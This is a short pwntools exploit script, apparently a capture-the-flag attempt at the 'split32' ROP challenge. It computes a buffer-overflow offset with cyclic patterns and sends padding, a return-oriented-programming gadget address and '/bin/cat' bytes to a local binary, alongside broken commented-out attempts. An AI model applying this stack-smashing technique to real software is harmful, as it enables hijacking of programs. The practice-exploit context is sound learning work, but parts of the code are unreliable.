# coding: utf-8
from pwn import * 
def red(prt):
    return "\033[91m{}\033[00m".format(prt)
def grn(prt):
    return "\033[92m{}\033[00m".format(prt)
def cyn(prt):
    return "\033[96m{}\033[00m".format(prt)
def flag(stuff):
    inner = re.search(r"\{.+\}", stuff).group()
    return  stuff.replace('UDCTF', cyn('UDCTF')).replace(inner.strip('{}'), red(inner.strip('{}'))).replace('{', grn('{')).replace('}', grn('}'))

def save(obj, filename):
    with open(filename, 'wb') as f:
        f.write(obj)

'''
payload = cyclic(100)
r = process('./split32')
print r.recv()
r.sendline(payload)
m = r.recv()
# m += r.recv()
print m
'''
rop_addr = 0x08048649
return_address = 0x006161616c
offset = cyclic_find(return_address) #44
#payload = cyclic(100) 
payload = 'A'*offset + p32(rop_addr)

for i in range(50):
    r = process('./split32')
    print r.recv()
    print offset
    payload = 'A'*i+p32(rop_addr)+'\x74\x61\x63\x2f\x6e\x69\x62\x2f'
    r.sendline(payload)
    print r.recv()
    r.close()
'''
'2f62696e2f636174'
'\x74\x61\x63\x2f\x6e\x69\x62\x2f'
rop_addr = 0x08048400
#  rop_addr = 0x08048747
ret
    urn_address = 0x0f7fd000a
offset = cyclic_find(return_address)
payload = '\x74\x61\x63\x2f\x6e\x69\x62\x2f'*offset + p32(rop_addr)
r.sendline(payload)
print r.recv()
'''
